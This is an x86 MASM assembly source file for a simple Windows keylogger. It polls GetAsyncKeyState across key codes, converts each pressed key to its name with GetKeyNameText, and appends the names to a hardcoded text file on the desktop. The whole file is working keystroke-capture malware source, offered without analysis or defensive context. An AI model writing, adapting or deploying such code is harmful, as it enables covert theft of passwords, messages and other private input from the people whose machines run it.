;/**************
;* By: Teuzero *
;***************/

.386
.MODEL FLAT, STDCALL

include windows.inc
include kernel32.inc
include user32.inc

includelib kernel32.lib
includelib user32.lib

.data

log db "C:\Users\c0d3_\Desktop\ShellcodeMsgBox\oi.txt",0
buffer db 100h dup (?)
bytes_escritos dd 0

.code
    start: 
            mov esi, 7
            mov eax, 1
            push eax
            call Sleep
            jmp ini
            
            ini:
            cmp esi, 255
            je start
            
            inc esi
            push esi
            call GetAsyncKeyState
            cmp eax, 0
            jnz loger
            jmp ini
            
            loger:
            push 0
            push esi
            call MapVirtualKey
            shl eax,16
            mov edi, 100h
            push edi
            push OFFSET buffer
            push eax
            call GetKeyNameText
            
            push 0
            push FILE_ATTRIBUTE_ARCHIVE
            push OPEN_ALWAYS
            push 0
            push 0
            push GENERIC_WRITE
            push OFFSET log
            call CreateFile
            cmp eax,0
            je exit
                
            mov ebx,eax
            push FILE_END
            push 0
            push 0
            push ebx
            call SetFilePointer
            
            push OFFSET buffer
            call lstrlen
            
            push 0
            push bytes_escritos
            push eax
            push OFFSET buffer
            push ebx
            call WriteFile
            
            mov edi, 100
            push edi
            call Sleep
            push ebx
            call CloseHandle
            xor edi,edi
            jmp ini
            
            exit:
            call ExitProcess    
    end start
